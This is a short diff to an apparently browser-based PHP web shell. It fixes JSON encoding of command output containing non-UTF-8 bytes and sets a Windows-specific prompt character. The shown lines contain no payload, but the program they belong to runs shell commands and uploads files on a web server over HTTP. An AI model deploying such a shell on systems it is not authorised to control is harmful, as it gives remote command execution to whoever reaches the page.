@@ -97,8 +97,19 @@ if (isset($_GET["feature"])) {
             $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);
     }
 
+    $encoded = json_encode($response);
+    if(!$encoded) {
+        //replace "unknown" charaters with ?
+        $i = 0;
+        foreach($response['stdout'] as $v) {
+            $response['stdout'][$i] = preg_replace('/[\x00-\x1F\x80-\xFF]/', '?', $v);
+            $i++;
+        }
+      $encoded = json_encode($response);
+    }
+
     header("Content-Type: application/json");
-    echo json_encode($response);
+    echo $encoded;
     die();
 }
 
@@ -212,6 +223,7 @@ if (isset($_GET["feature"])) {
         </style>
 
         <script>
+            var cmdPrompt = <?php echo defined('PHP_WINDOWS_VERSION_BUILD') ? "'>';\n" : "'#';\n";?>
             var CWD = null;
             var commandHistory = [];
             var historyPosition = 0;
@@ -330,7 +342,7 @@ if (isset($_GET["feature"])) {
                     var splittedCwd = cwd.split("/");
                     shortCwd = "…/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
                 }
-                return "<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
+                return "<span title=\"" + cwd + "\">" + shortCwd + "</span>" + cmdPrompt;
             }
 
             function updateCwd(cwd) {
